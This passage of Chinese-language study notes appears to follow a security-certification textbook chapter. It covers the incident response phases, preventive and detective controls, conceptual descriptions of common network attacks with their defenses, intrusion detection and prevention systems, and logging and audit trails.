报告</h3><p>报告是指在组织内通报事件并将情况上报给组织外的相关部门和个人。</p><p>高管需要对严重安全破坏事件知情。</p><p>每个组织都有责任了解哪些法律适用于自身，并遵守这些法律。</p><p>如果对系统的一次攻击导致攻击者掌握了有关个人身份信息，系统负责人有责任把攻击及攻击者访问了哪些数据的情况告知用户。</p><p>组织在响应严重安全事件的过程中应该考虑把事件报告给执法部门。</p><p>如果个人信息被暴露，组织必须向执法部门报告安全事件。</p><h3 id="5-恢复"><a href="#5-恢复" class="headerlink" title="5. 恢复"></a>5. 恢复</h3><p>恢复系统或使其返回正常运行状态。</p><p>小事件，重启系统。</p><p>重大事件，重建系统，从最近的备份中恢复所有数据。</p><p>重建系统时，必须确保系统配置恰当，安全性至少要达到事件之前的水平。</p><p>系统配置检查事项：</p><ul><li>访问控制列表（包括防火墙或路由器规则）</li><li>服务和协议（确保禁用或移除不需要的服务和协议）</li><li>补丁（确保打上了所有最新补丁）</li><li>用户账号（确保账号更改了默认配置）</li><li>破坏（确保遭到破坏的所有地方都得到了修复）</li></ul><h3 id="6-补救"><a href="#6-补救" class="headerlink" title="6. 补救"></a>6. 补救</h3><p>在补救阶段，安全人员首先查看事件，查明事件发生原因，采取措施防止事件再次发生。</p><p>需要进行一次根本原因分析。</p><p>根本原因分析通过剖析事件来判断事件起因。</p><p>缺乏最新补丁，补救措施为执行补丁管理方案。</p><p>缺乏输入验证技术，补救措施为风险应用程序，增加输入验证功能。</p><h3 id="7-总结教训"><a href="#7-总结教训" class="headerlink" title="7. 总结教训"></a>7. 总结教训</h3><p>总结教训阶段，安全人员查验事件发生和响应的整个过程，以确定是否要总结经验教训。</p><p>安全人员在查验事件响应时寻求响应行动中需要改进的方面。</p><p>总结教训阶段结果反馈给事件管理的检测环节。</p><p>事件响应团队总结经验教训后，编写报告。根据结果建议改进程序，增加安全控制，甚至更改策略。</p><p>管理层决定采纳哪些建议，并对没有采纳建议而存在的风险负责。</p><h1 id="17-2-实施检测和预防措施"><a href="#17-2-实施检测和预防措施" class="headerlink" title="17.2 实施检测和预防措施"></a>17.2 实施检测和预防措施</h1><p>无论预防措施多么有效，事件依然会发生。</p><h3 id="预防性控制"><a href="#预防性控制" class="headerlink" title="预防性控制"></a>预防性控制</h3><p>预防性控制（preventative control）力求阻碍或组织不必要或未经授权的活动发生。</p><p>预防性控制示例：</p><p>围栏</p><p>锁具</p><p>生物特征识别</p><p>职责分离策略</p><p>岗位轮换策略</p><p>数据分类</p><p>访问控制方法</p><p>加密</p><p>智能卡</p><p>回呼程序</p><p>安全策略</p><p>安全意识培训</p><p>杀毒软件</p><p>防火墙</p><p>入侵预防系统</p><h3 id="检测性控制"><a href="#检测性控制" class="headerlink" title="检测性控制"></a>检测性控制</h3><p>检测性控制（detective control）力求发现或检测不必要的或未经授权的活动。</p><p>检测性控制在事件发生后运行，只有在事件发生后才能发现。</p><p>检测性控制的例子：</p><p>保安人员</p><p>运动检测器</p><p>对闭路电视监控系统捕捉的事件进行记录和审查</p><p>岗位轮换策略</p><p>强制休假策略</p><p>审计踪迹</p><p>蜜罐或蜜网</p><p>入侵检测系统</p><p>违规报告</p><p>对用户的监督和审查</p><p>事件调查</p><h2 id="17-2-1-基本预防措施"><a href="#17-2-1-基本预防措施" class="headerlink" title="17.2.1 基本预防措施"></a>17.2.1 基本预防措施</h2><p><strong>保持系统和应用程序即时更新</strong></p><p><strong>移除或禁用不需要的服务和协议</strong></p><p><strong>使用入侵检测和预防系统</strong></p><p><strong>使用最新版反恶意软件程序</strong></p><p><strong>使用防火墙</strong></p><p><strong>执行配置和系统管理流程</strong></p><p>必须时刻保持警惕，打上最新补丁并保持适当配置。</p><p>防火墙和入侵检测预防系统检测和收集证据。</p><h2 id="17-2-2-了解攻击"><a href="#17-2-2-了解攻击" class="headerlink" title="17.2.2 了解攻击"></a>17.2.2 了解攻击</h2><p>了解常见的攻击方法，以便于采取措施预防攻击，识别攻击做出适当的响应。</p><h3 id="1-僵尸网"><a href="#1-僵尸网" class="headerlink" title="1. 僵尸网"></a>1. 僵尸网</h3><p>多个僵尸在一个网络中形成一个僵尸网。</p><p>僵尸网中的计算机依照攻击者的指令做任何事情。</p><p>僵尸牧人通过一台或多台命令和控制（command-and-control，C&amp;C 或 C2）服务器操控僵尸网中的所有计算机。</p><p>僵尸会被动或主动联系服务器。</p><p>僵尸危害：<br>系统中安装恶意软件</p><p>搜索口令或感兴趣的文件</p><p>捕捉用户击键动作</p><p>发动攻击</p><p>防止拉入僵尸网络的防御方法：<strong>深度防御战略，实施多层次的安全保护策略</strong></p><p>最新反恶意软件程序+最新安全补丁。</p><p>对用户开展教育，类似防范钓鱼邮件。</p><p>保持浏览器及其插件即时更新。</p><p>不要禁用浏览器内部安全性能，例如沙箱。</p><h3 id="2-拒绝服务攻击-DoS"><a href="#2-拒绝服务攻击-DoS" class="headerlink" title="2. 拒绝服务攻击 DoS"></a>2. 拒绝服务攻击 DoS</h3><p>拒绝服务（denial-of-service，DoS）攻击阻止系统处理或响应对资源和对象的合法访问或请求。</p><p>DoS 攻击只是让系统变慢，不会阻止系统响应任何合法通信流。</p><p>常见 DoS  攻击形式：</p><ul><li>发送大量数据包，导致服务器瘫痪</li><li>利用操作系统、服务或应用程序的已知缺陷或漏洞，利用缺陷导致系统崩溃或 CPU 被完全占用</li></ul><p>DoS 攻击可导致性能下降、系统崩溃、系统重启、数据损毁、服务被拦截等。</p><p>DoS 攻击中的源地址很少是攻击者的 IP 地址。</p><p>DoS 攻击可以来自单个系统，也可以以单个系统为目标。</p><p>分布式拒绝服务（distributed denial-of-service，DDoS）攻击：多个系统同时攻击一个系统。</p><p>攻击者常用僵尸网发动攻击。</p><p>DDoS 工具针对面向互联网的系统。</p><p>预防措施和抑制DDoS 服务可以防止和抑制攻击。</p><p>分布式反射型拒绝服务（distributed reflective denial-of-service，DRDoS）攻击是一种 DoS 变体，将反射方法用于攻击。</p><p>DNS 中毒攻击、smurf 攻击和 fraggle 攻击 就是 DRDoS。</p><h3 id="3-SYN-洪水攻击"><a href="#3-SYN-洪水攻击" class="headerlink" title="3. SYN 洪水攻击"></a>3. SYN 洪水攻击</h3><p>SYN 洪水攻击（SYN flood attack）是一种常见的 DoS 攻击形式。</p><p>中断被传输控制协议（TCP）用来发起通信会话的标准三次握手。</p><p>攻击者发出多个 SYN  包，绝不用 ACK 包完成连接。</p><p>不完整会话消耗资源。</p><p>攻击消耗可用内存和处理能力，致使受害者系统变慢或崩溃。</p><p>攻击者每个 SYN 攻击包伪造源地址。</p><p>SYN 洪水攻击防御方法：</p><p>利用 SYN cookie，检查 SYN cookie 并建立会话。</p><p>缩短服务器等待 ACK 的时间，默认是 3 分钟，缩短时间释放内存。</p><h4 id="TCP-复位攻击"><a href="#TCP-复位攻击" class="headerlink" title="TCP 复位攻击"></a>TCP 复位攻击</h4><p>TCP 复位攻击是操纵 TCP 会话的另一种攻击手段。</p><p>攻击者在 RST 包中伪造源 IP 地址并切断活跃会话，系统需要重新建联。</p><p>威胁需要通过持久会话和其他系统交换数据的系统。</p><h3 id="4-Smurf-和-fraggle-攻击-UDP"><a href="#4-Smurf-和-fraggle-攻击-UDP" class="headerlink" title="4. Smurf 和 fraggle 攻击-UDP"></a>4. Smurf 和 fraggle 攻击-UDP</h3><p>Smurf 攻击是洪水攻击的一种类型。</p><p>使用的是 ICMP 回声包。</p><p>攻击者以广播形式把 ICMP 请求数据包发送给网络上所有系统并伪造源 IP 地址，所有系统会把响应包发送给被伪造的 IP 地址，从而导致受害者被淹没。</p><p>Smurf 攻击通过路由器发送定向广播，形成一个放大网（也叫 Smurf 放大器）。</p><p><strong>Smurf 攻击防御方法</strong></p><p>1、正确配置路由器，不再转发定向广播通信流</p><p>2、防火墙、路由器，甚至服务器上禁用 ICMP</p><p>fraggle 攻击利用的是 UDP  7 端口和 19 端口。</p><p>fraggle  攻击利用假受害者 IP 地址广播 UDP 数据包，造成网络上所有系统都向受害者发送通信流。</p><h3 id="5-ping-洪水"><a href="#5-ping-洪水" class="headerlink" title="5. ping 洪水"></a>5. ping 洪水</h3><p>ping 洪水攻击用 ping 请求淹没受害者。</p><p>利用僵尸网内的僵尸发起攻击，系统会在响应 ping 请求的过程中不堪重负。</p><p><strong>ping 洪水攻击防御方法</strong></p><p>拦截 ICMP 请求包</p><p>入侵检测系统可以检测出 ping 洪水，然后修改环境参数，拦截 ICMP 回声请求</p><h4 id="死亡之-ping"><a href="#死亡之-ping" class="headerlink" title="死亡之 ping"></a>死亡之 ping</h4><p>使用超大 ping 数据包，导致超出系统的处理能力，导致系统崩溃</p><h4 id="泪滴"><a href="#泪滴" class="headerlink" title="泪滴"></a>泪滴</h4><p>把数据包打碎，使系统无法重新组成原始状态，导致系统崩溃</p><h4 id="land-攻击"><a href="#land-攻击" class="headerlink" title="land 攻击"></a>land 攻击</h4><p>攻击者把 受害者的 IP 地址同时作为 源 IP 地址和目标 IP 地址，向受害者发送假 SYN 包。</p><p>抵御任何缓冲区溢出攻击的最佳保护措施之一是给系统更新补丁。</p><h3 id="6-零日利用"><a href="#6-零日利用" class="headerlink" title="6. 零日利用"></a>6. 零日利用</h3><p>零日利用（zero-day exploit）是指利用别人还不知道漏洞的攻击。</p><p>不同情境下零日利用的词义：</p><p><strong>攻击者最先发现漏洞</strong>：零日攻击的普通定义。</p><p><strong>供应商获悉漏洞但还没有发布补丁</strong>：补丁未出现的时间段利用漏洞被称为零日利用。</p><p><strong>供应商发布补丁，系统在 24 小时内遭到攻击</strong>：说法并不普遍。</p><p><strong>零日攻击利用防御方法</strong></p><p>确保系统不运行不需要的服务和协议，以缩小系统的受攻击面</p><p>启动基于网络和基于主机的防火墙，以限制潜在的恶意通信流</p><p>用入侵检测和预防系统来帮助检测和拦截潜在攻击</p><p>使用蜜罐观察攻击情况，揭示使用零日利用的攻击</p><h3 id="7-中间人攻击"><a href="#7-中间人攻击" class="headerlink" title="7. 中间人攻击"></a>7. 中间人攻击</h3><p>在通信的两个端点之间建立位置，意味着发生了中间人（man-in-the-middle，MITM）攻击（有时候被称为路径攻击）</p><p>中间人攻击分两种类型：<br>一种是复制或嗅探两个通信参与方之间的通信流。</p><p>另一种是攻击者把自己定位在通信线路上，充当通信的存储转发或代理机制。</p><p>中间人攻击需要多重攻击配合，在客户端面前伪造为服务端，在服务端面前伪造为客户端。</p><p><strong>中间人攻击防御方法</strong></p><p>使用虚拟专用网（VPN）来规避攻击</p><p>系统即时更新补丁可以组织一些</p><p>入侵检测系统无法检测出来，但是能检测到通信链路上发生的异常活动并告警。</p><h3 id="8-蓄意破坏"><a href="#8-蓄意破坏" class="headerlink" title="8.  蓄意破坏"></a>8.  蓄意破坏</h3><p>员工蓄意破坏（sabotage）是指员工对其组织实施破坏的一种犯罪行为。</p><p><strong>蓄意破坏的防御方法</strong></p><p>在离职后禁用员工账号的访问权</p><p>加大审计力度、监测异常或未经授权的活动</p><p>确保员工与管理层沟通顺畅，适当补偿员工</p><h2 id="17-2-3-入侵检测和预防系统"><a href="#17-2-3-入侵检测和预防系统" class="headerlink" title="17.2.3 入侵检测和预防系统"></a>17.2.3 入侵检测和预防系统</h2><p>入侵检测系统（IDS）和入侵预防系统（IPS）是常被组织用来检测和预防攻击的两种方法。</p><p>当攻击者绕过或挫败安全机制并访问组织资源时，就意味着发生了入侵（intrusion）。</p><p>入侵检测（intrusion detection）是一种特殊的监测形式，监控所发生的事件（往往是实时的），以检测表明出现潜在事件或入侵的异常活动。</p><p>入侵检测系统（intrusion detection system，IDS）自动检查日志和实时系统事件，以检测入侵企图和系统故障。</p><p>由于入侵预防系统（IPS）包含检测能力，因此也称为入侵检测和预防系统（IDPS）</p><p>IDS 的主要目的是提供一种可对入侵做出及时和准确响应的方法。</p><p>IDS  可用于检测外部 DoS &#x2F; DDoS 攻击和内部传播类似蠕虫的攻击。</p><p>入侵预防系统 IPS 包含 IDS  的所有功能，也可以采取额外措施来阻止或预防入侵。 </p><h3 id="1-基于知识检测和基于行为检测"><a href="#1-基于知识检测和基于行为检测" class="headerlink" title="1. 基于知识检测和基于行为检测"></a>1. 基于知识检测和基于行为检测</h3><p>IDS 通过监测网络通信流和检查日志来主动监视可疑活动。</p><p>IDS 从路由器、防火墙等传感器获取日志分析。</p><p>IDS 评估数据的两种方法：</p><p>基于知识检测：使用与反恶意软件程序所用签名定义类似的签名</p><p>基于行为检测：不使用签名，而是将活动与正常表现基线进行对比，从而检测出异常行为。</p><h4 id="基于知识检测"><a href="#基于知识检测" class="headerlink" title="基于知识检测"></a>基于知识检测</h4><p>基于知识检测（knowledge-based detection）也被称为基于签名检测（signature-based detection）或模式匹配检测，是最常用的检测方法。</p><p>使用 IDS 供应商开发的已知攻击数据库。</p><p>优势：假阳性率很低</p><p>劣势：只对已知的攻击方法有效，新攻击或改动的攻击方式识别不出来</p><p>IDS 数据库必须定期用新攻击签名更新（提供自动更新签名的方法）</p><h4 id="基于行为检测"><a href="#基于行为检测" class="headerlink" title="基于行为检测"></a>基于行为检测</h4><p>基于行为检测（behavior-based detection），也被称为统计入侵检测、异常检测或启发式检测。</p><p>首先创建正常活动和事件的基线，用基线来确定正常活动。</p><p>基线通常在一个有限时段内创建。</p><p>网络发生变化，基线也需要更新。</p><p>用户和实体行为分析（UEBA ）功能，根据个人行为创建用户文档（类似于网络基线）</p><p>异常分析提升了 IDS  的能力，识别和响应流量或活动的突然增加、多次失败登录尝试、非正常工作意外的活动。</p><p>基于行为的 IDS 可以被认为是专家系统或伪人工智能系统的标签。</p><p>基于行为的 IDS  可以学习事件并对事件做出假设。</p><p>基于行为的 IDS 可以检测出没有签名、尚不能被基于签名方法检测到的较新攻击</p><p><strong>事件层面概念</strong>：</p><p>真阳性：有事件发生并被检测出来。</p><p>假阴性：有事件发生但没有被检测出来。</p><p>假阳性：有事件被检测出来但实际没有发生。</p><p>真阴性：没有发生事件而且没有检测出事件。</p><p><strong>生物特征识别概念</strong></p><p>真阳性：注册用户尝试验证身份并通过验证</p><p>假阴性：注册用户尝试验证身份但没有通过验证（或被拒绝）</p><p>假阳性：冒名顶替者尝试验证身份并通过验证</p><p>真阴性：冒名顶替者尝试验证身份但没有通过验证。</p><p>基于行为的 IDS 缺点：</p><p>经常发出假警报，也叫假阳性。</p><p>基于签名的 IDS 假警报率（假阳性）很低，但是有很高的假阴性率，尤其是面对新攻击。</p><p>在允许 IDC 发出大量假警报与确保 IDS 报告真实攻击之间找到平衡点。</p><h3 id="2-IDS-响应"><a href="#2-IDS-响应" class="headerlink" title="2. IDS 响应"></a>2. IDS 响应</h3><p>IDS 检测到事件后触发警报或发出警示，会以被动或主动的方式做出响应。</p><p><strong>主动响应</strong></p><p>记录事件和发出通知，更改环境以阻止活动。</p><p>修改 ACL 以拦截基于端口、协议和源地址的通信流。</p><p>还可以拦截可疑或行为不良用户对资源的访问。</p><p><strong>被动响应</strong></p><p>记录事件和发出通知。</p><p>被动响应以电子邮件或短信等不同方式发送给管理员。</p><p>IPS 都是被安放在承载通信流的线路上的。</p><h3 id="3-基于主机的-IDS-和-基于网络的-IDS"><a href="#3-基于主机的-IDS-和-基于网络的-IDS" class="headerlink" title="3. 基于主机的 IDS  和 基于网络的 IDS"></a>3. 基于主机的 IDS  和 基于网络的 IDS</h3><p>IDS 通常分为基于 主机和基于网络的。</p><p>基于主机的 IDS （host-based IDS，HIDS）监测一台计算机或主机。</p><p>基于网络的 IDS （network-based IDS ，NIDS）通过观察网络通信流模式监测网络。</p><p>基于应用的 IDS ，是基于网络 IDS  的一种特定类型，监测两个或多个服务器之间特定应用程序的通信流。</p><h4 id="基于主机的-IDS-HIDS"><a href="#基于主机的-IDS-HIDS" class="headerlink" title="基于主机的 IDS-HIDS"></a>基于主机的 IDS-HIDS</h4><p>监测计算机的活动，包括进程调用以及系统、应用程序、安全措施和基于主机防火墙日志记录的信息。</p><p>优势：</p><p>检查事件的详细程度超过 NIDS</p><p>能精确定位被攻击破坏的文件</p><p>可以跟踪攻击者所用的进程</p><p>HIDS 能检测出 NIDS 检测出来的主机系统异常情况</p><p>主机IDS 包含反恶意软件能力</p><p>劣势：</p><p>HIDS 管理成本更高</p><p>HIDS 不能检测其他系统受到的网络攻击</p><p>HIDS 需要消耗大量系统资源，降低主机系统的性能</p><p>HIDS 更容易被入侵者发现和禁用</p><p><strong>只在关键服务器上安装 HIDS</strong></p><h4 id="基于网络的-IDS-NIDS"><a href="#基于网络的-IDS-NIDS" class="headerlink" title="基于网络的 IDS-NIDS"></a>基于网络的 IDS-NIDS</h4><p>NIDS 监测并评估网络活动，以找出攻击或异常事件。</p><p>NIDS 可以通过远程传感器监测大型网络，使用传感器在关键网络位置收集数据，将数据发送给中央管理控制台，例如：安全信息和事件管理（SIEM）系统。</p><p><strong>监测加密通信流</strong></p><p>使用 TLS 解密器，也叫 SSL 解密器。</p><p>TLS 解密器检测 TLS 通信流，采取措施对其进行解密，然后把解密的通信流发送给 IDPS 进行检查。</p><p>TLS 解密器检测和拦截内部客户端和互联网服务器之间的 TLS 握手，建立两个 HTTPS 会话。</p><p>TLS 解密器弱点：</p><p>高级持续性威胁（APT）在将通信流从网络中过滤出来前就已经进行加密，由于加密是在客户端上执行的，而不是在 TLS 会话中加密。</p><p>交换机端口被用于映射所有流量，也被称为交换端口分析器（SPAN）端口</p><p>NIDS  的中央控制台安装在经过加固的专用计算机上，减少了 NIDS 的漏洞，可以让 NIDS 在几乎不可见的状态下运行。</p><p>单独部署不会对其他设备性能产生影响，可以增加 NIDS 来平衡负载。</p><p>NIDS 通过执行反向地址解析协议（RARP）或反向域名系统（DNS）查找发现攻击源。</p><p>NIDS 能够检测到刚刚发起或正在进行的攻击。</p><p>不要对入侵者发起反击或尝试反向黑客攻击，不道德、风险也很大，也是非法的，记录日志和嗅探获取证据。</p><h3 id="4-入侵预防系统-IPS"><a href="#4-入侵预防系统-IPS" class="headerlink" title="4. 入侵预防系统 IPS"></a>4. 入侵预防系统 IPS</h3><p>入侵预防系统（intrusion prevention system，IPS）是一种特殊类型的主动响应 IDS，可赶在攻击到达目标系统之前将其检测出来并加以拦截。</p><p>NIDS 与基于网络的 IPS （NIPS）之间的明显差别在于 NIPS 是放在承载通信流的内联线路上的。</p><p>所有通信流都必须从 NIPS 经过，而 NIPS 可以选择转发哪些通信流，以及分析拦截哪些通信流。</p><p><img src="/2024/12/24/informationCocoon/tk_group_message/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E4%BA%8B%E4%BB%B6%E7%9A%84%E9%A2%84%E9%98%B2%E5%92%8C%E5%93%8D%E5%BA%94/image-20250612084418720.png" alt="image-20250612084418720"></p><p>主动 NIDS  没有放在内联线路上，只能在攻击到达目标之后把它查出来并拦截，不能预防攻击。</p><p>NIPS 可以使用基于知识检测或基于行为检测。</p><p>当前趋势是用 NIPS 取代 NIDS。</p><h2 id="17-2-4-具体预防措施"><a href="#17-2-4-具体预防措施" class="headerlink" title="17.2.4 具体预防措施"></a>17.2.4 具体预防措施</h2><h3 id="1-蜜罐-蜜网"><a href="#1-蜜罐-蜜网" class="headerlink" title="1. 蜜罐&#x2F;蜜网"></a>1. 蜜罐&#x2F;蜜网</h3><p>蜜罐（honeypot）是为充当引诱入侵者或内部人员威胁的陷阱而创建的单个计算机。</p><p>蜜网（honeynet）是两个或多个连接在一起来冒充网络的蜜罐。</p><p>蜜罐的目的是引起入侵者的注意，使他们远离承载者重要资源的合法网络。</p><p>蜜罐使管理员能在不影响实时环境的情况下观察攻击者的活动。</p><p>可以作为抵御零日利用的有效手段。</p><p>蜜罐和蜜网可以放在网络任何地方，经常会放在虚拟系统中。</p><p>管理员经常给蜜罐配上伪缺陷（pseudo-flaw），以模拟众所周知的操作系统漏洞。</p><p>诱惑和诱捕的问题</p><p>诱惑是不需要蜜罐主任诱导进入的蜜罐。</p><p>诱捕是蜜罐主人诱导进入的蜜罐。</p><p>诱捕是非法的，需要关注法律。</p><h3 id="2-警示"><a href="#2-警示" class="headerlink" title="2. 警示"></a>2. 警示</h3><p>警示告知用户和入侵者基本的安全方针策略。</p><p>任何在线活动都会被审计和监测。</p><p>警示的措辞很重要。</p><p>能以某种方式登录系统的未授权者也会看到警示。</p><p>警示既告知授权用户也告知未经授权使用者。</p><h3 id="3-反恶意软件"><a href="#3-反恶意软件" class="headerlink" title="3. 反恶意软件"></a>3. 反恶意软件</h3><p>抵御恶意代码的最重要保护手段是使用带最新签名文件并具备启发式能力的反恶意软件程序。</p><p>定期更新签名（目前是自动一天检查几次更新）</p><p>多管齐下的方式拦截恶意软件和检测任何进入的恶意软件。</p><p>具备内容过滤能力的防火区（或专用内容过滤设备）部署在边界上。</p><p>专用反恶意软件安装在邮件服务器上，检测过滤电子邮件传递的恶意代码&#x2F;</p><p>每个系统都安装检测和拦截恶意软件的反恶意软件程序。</p><p>每个系统安装反恶意软件程序在拦截互联网内容外，有助于使系统免受任何来源的病毒。</p><p>每个系统上只安装一种反恶意软件。</p><p>严格遵守最小特权原则，恶意程序无法安装或权限较低。</p><p>教育用户了解恶意代码的危险性、攻击者的手段以及如何限制风险。</p><h3 id="4-白名单和黑名单"><a href="#4-白名单和黑名单" class="headerlink" title="4.白名单和黑名单"></a>4.白名单和黑名单</h3><p>白名单：允许列表</p><p>黑名单：拦截列表&#x2F;拒绝列表</p><p>用于控制哪些应用程序可以运行，哪些应用程序不能运行的方法之一。</p><p>针对应用程序使用允许列表和拒绝列表，有助于防止恶意软件感染。</p><p>一个系统只能使用一个列表：要么使用运行列表，要么使用拒绝列表。</p><p>有些允许列表标识了用哈希算法创建哈西函数的应用程序。</p><p>示例：<br>苹果 iOS</p><h3 id="5-防火墙"><a href="#5-防火墙" class="headerlink" title="5.防火墙"></a>5.防火墙</h3><p>防火墙属于预防和技术控制，力求通过技术手段来防止安全事件发生。</p><h4 id="防火墙基本原则"><a href="#防火墙基本原则" class="headerlink" title="防火墙基本原则"></a>防火墙基本原则</h4><ul><li>拦截路由器上的定向广播</li><li>在边界拦截私网 IP 地址</li></ul><p>基本防火墙根据 IP 地址、端口和一些带协议编号的协议过滤通信流。</p><p>防火墙放在网络边界，监视所有进出通信流。</p><p>防火墙执行 ACL 规则，允许特定通信流通过，以隐式拒绝规则结束。</p><p>防火墙阻止 ICMP 回声请求来拦截 ping 攻击。</p><p>所有 ICMP 通信流都使用编号为 1 的协议。</p><p>第二代防火墙增加了额外的过滤功能。</p><p>例如：<br>应用程序层面网关防火墙可根据特定应用程序的要求过滤通信流；</p><p>电路层面网关防火墙（circuit-level gateway firewall）根据通信电路过滤通信流。</p><p>第三代防火墙（状态检测防火墙（stateful inspection firewall）和动态包过滤防火墙）根据通信流在流量中的状态过滤通信流。</p><p>应用程序防火墙控制进出特定应用程序或服务的通信流。例如：WAF</p><p>下一代防火墙（NGFW）集多种过滤功能于一身，形成一种统一威胁（unified threat management）手段。</p><p>下一代防火墙包括包过滤、状态检查、包检查技术、黑白名单过滤，包含入侵检测和入侵预防功能。</p><h3 id="6-沙箱"><a href="#6-沙箱" class="headerlink" title="6.沙箱"></a>6.沙箱</h3><p>沙箱（sandboxing）为应用程序提供安全边界，可防止应用程序和其他应用程序交互。</p><p>反恶意软件应用借助沙箱技术测试未知应用程序。</p><p>沙箱技术可以防止该应用程序感染其他应用程序或操作系统。</p><p>许多反恶意软件程序供应商利用沙箱虚拟化技术观察恶意软件的行为。</p><h3 id="7-第三方安全服务"><a href="#7-第三方安全服务" class="headerlink" title="7.第三方安全服务"></a>7.第三方安全服务</h3><p>必须向外部实体保证第三方服务提供者遵守具体安全要求。</p><p>PCI DSS 不允许组织将自己的责任外包出去。</p><h1 id="17-3-日志记录和监测"><a href="#17-3-日志记录和监测" class="headerlink" title="17.3 日志记录和监测"></a>17.3 日志记录和监测</h1><p>日志记录和监测程序可帮助组织预防事件，并在有事件发生的时候做出有效响应。</p><p>日志记录机制把事件记录到各种日志中并对这些事件进行监测。</p><p>日志记录与监测结合起来使用，组织可跟踪、记录和审查活动，形成全面的问责体系。</p><h2 id="17-3-1-日志记录技术"><a href="#17-3-1-日志记录技术" class="headerlink" title="17.3.1 日志记录技术"></a>17.3.1 日志记录技术</h2><p>日志记录（logging）是将有关事件的信息写入日志文件或数据库的过程。</p><p>日志记录捕捉事件、变更、消息和其他描述系统上活动的数据。</p><p>日志会记录一些细节，比如何时、何地、何人、发生了何事以及如何发生的。</p><p>安全身份识别和验证流程作为问责先觉条件的要求。</p><p>审计不仅仅涉及日志记录，要审查或检查整个环境的合规情况。</p><h3 id="1-常见日志类型"><a href="#1-常见日志类型" class="headerlink" title="1. 常见日志类型"></a>1. 常见日志类型</h3><h4 id="安全日志"><a href="#安全日志" class="headerlink" title="安全日志"></a>安全日志</h4><p>安全日志记录对文件、文件夹、打印机等资源的访问。</p><h4 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h4><p>系统日志记录系统事件，例如系统启动、关闭，服务启动、关闭，服务属性修改事件记录。</p><p>检测系统何时重启或检测服务何时关闭或修改的日志，可以帮助管理员发现潜在的恶意活动。</p><h4 id="应用日志"><a href="#应用日志" class="headerlink" title="应用日志"></a>应用日志</h4><p>应用日志记录有关具体应用程序的信息。</p><p>应用程序开发人员选择记录哪些内容。</p><h4 id="防火墙日志"><a href="#防火墙日志" class="headerlink" title="防火墙日志"></a>防火墙日志</h4><p>防火墙日志记录与到达防火墙的任何通信流相关的事件。</p><p>包括防火墙放行的通信流和拦截的通信流。</p><p>通常记录关键数据包信息，源、目的 IP 及端口。不记录数据包的实际内容。</p><h4 id="代理日志"><a href="#代理日志" class="headerlink" title="代理日志"></a>代理日志</h4><p>代理服务器可以提高用户访问互联网的效率，能控制允许用户访问哪些网站。</p><p>代理日志具备记录详细信息的能力。</p><p>记录访问了哪些网络以及在网站逗留了多长时间</p><p>记录用户何时试图访问已被禁止访问的站点</p><h4 id="变更日志"><a href="#变更日志" class="headerlink" title="变更日志"></a>变更日志</h4><p>变更日志记录系统的变更请求、批准和实际变更，是变更总流程中的一部分。</p><p>变更日志可以由人工创建、也可以由内部网页创建。</p><p>变更日志可以用于追踪得到批准的变更。</p><p>变更日志可以为灾难恢复计划提供帮助。</p><p>日志记录通常是操作系统以及大多数应用程序和服务本身就就具备的一个性能。</p><p>特权账号发生的事件应该被纳入日志计划。</p><h3 id="2-保护日志数据"><a href="#2-保护日志数据" class="headerlink" title="2. 保护日志数据"></a>2. 保护日志数据</h3><p>组织内人员可以根据日志来重建事件发生之前和事件发展过程中的事态，前提是日志不曾被人篡改。</p><p>务必保护日志文件，使其不受未经授权的访问和未经授权的修改。</p><p>常见保护措施：<br>日志文件复制到中央系统中保护起来。</p><p>限制对日志文件的访问</p><p>强制要求备份日志文件，并规定保留日志文件的时间</p><p>当不再需要日志时，必须将其销毁。</p><p>NIST 审计数据规定的最低安全要求：</p><ul><li>按监测、分析、调查以及报告违法、未经授权或不当信息系统活动所需要的程序，创建、保护和保留信息系统审计记录。</li><li>确保单个信息系统用户的活动可被精准跟踪至用户本身，从而可就用户的行为追究责任。</li></ul><h2 id="17-3-2-监测的作用"><a href="#17-3-2-监测的作用" class="headerlink" title="17.3.2 监测的作用"></a>17.3.2 监测的作用</h2><p>监测的收益</p><ul><li>加强问责制的实施</li><li>帮助开展调查和排除基本故障</li></ul><h3 id="1-审计踪迹-audit-trail"><a href="#1-审计踪迹-audit-trail" class="headerlink" title="1. 审计踪迹 audit trail"></a>1. 审计踪迹 audit trail</h3><p>审计踪迹（audit trail）是在将有关事件和事发情况的信息保存到一个或多个数据库或日志文件中时创建的记录。</p><p>审计踪迹提供系统活动的记录，可重建安全事件发生之前和事件发展过程中的活动。</p><p>安全人员从审计踪迹提取事件信息，用于证明罪责、反驳指控或其他目的。</p><p>审计踪迹允许安全人员按照正序或倒序检查和跟踪事件。</p><p>使用审计踪迹是执行检测性安全控制的一种被动形式。起威慑作用。</p><p>高级持续威胁（APT）的标配就是定位和删除活动记录下来的日志。</p><p>审计踪迹用于起诉犯罪分子的必不可少的证据。</p><p>审计踪迹中的数据具有很高价值，务必确保日志在保护下不被篡改或删除。</p><h3 id="2-监测和问责"><a href="#2-监测和问责" class="headerlink" title="2.监测和问责"></a>2.监测和问责</h3><p>监测是一项必要功能，可确保行事主体（员工、用户）能对自己的行为和活动负责。</p><p>监测活动可提升积极的用户行为并敦促用户遵守组织的安全策略。</p><p>知道由日志记录活动的用户不太会试图绕过安全控制或进行未经授权或受限制的活动。</p><p>一旦出现触发或违反安全策略的情况，应该立即确定违规的源头，追究责任人的责任，严重可能解雇或起诉。</p><p>法律往往会对监测和问责的实施提出具体要求。</p><p>问责制需要在企业的每个层级实行。</p><h3 id="3-监测和调查"><a href="#3-监测和调查" class="headerlink" title="3.监测和调查"></a>3.监测和调查</h3><p>审计踪迹可以使调查人员能在事件发生很久以后重建事件。</p><p>审计踪迹可以记录访问权滥用、特权违规、未遂入侵和许多不同的攻击类型。</p><p>确保给日志打上准确的时间戳并确保时间戳在整个环境中保持一致。</p><p>方法：</p><p>建立内部网络时间协议（NTP）服务器</p><p>内部时间服务器与外部可信事件源同步</p><p>其他系统与内部 NTP 服务器同步</p><h3 id="4-监测和问题识别"><a href="#4-监测和问题识别" class="headerlink" title="4.监测和问题识别"></a>4.监测和问题识别</h3><p>审计踪迹可就所记录的事件为管理员提供有用的细节。</p><p>审计踪迹记录恶意攻击、系统故障、操作系统故障和软件错误，甚至崩溃转储文件。</p><p>识别问题后继续跟踪日志信息。</p><h2 id="17-3-3-监测技术"><a href="#17-3-3-监测技术" class="headerlink" title="17.3.3 监测技术"></a>17.3.3 